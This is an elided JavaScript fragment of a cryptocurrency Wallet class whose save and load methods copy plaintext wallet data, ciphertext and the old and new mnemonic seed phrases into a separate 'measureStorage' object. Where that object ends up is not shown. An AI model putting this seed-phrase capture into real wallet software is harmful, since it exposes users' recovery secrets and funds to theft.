...
class Wallet {
  ...
  async save(password = "", legacyEncryption = false) {
    try {
      ...
      let cipherText;
      set(this.measureStorage, "saveWallet.data", data);
      if (legacyEncryption) {
      ...
      set(this.measureStorage, "saveWallet.cipherText", cipherText);
  ...
  async measureLoadWallet(passphrase) {
    try {
      ...
      if (this.Storage) {
        ...
        set(this.measureStorage, "loadWalletData.cipherText", cipherText);
        ...
        try {
          ...
          try {
            const sub = {
              oldName: obj?.Name,
              oldMnemonic: obj?.Mnemonic,
              newMnemonic: this.Mnemonic,
              newName: this?.Name,
            };
            set(this.measureStorage, "loadWalletData", sub);
          } catch {
            //
          }
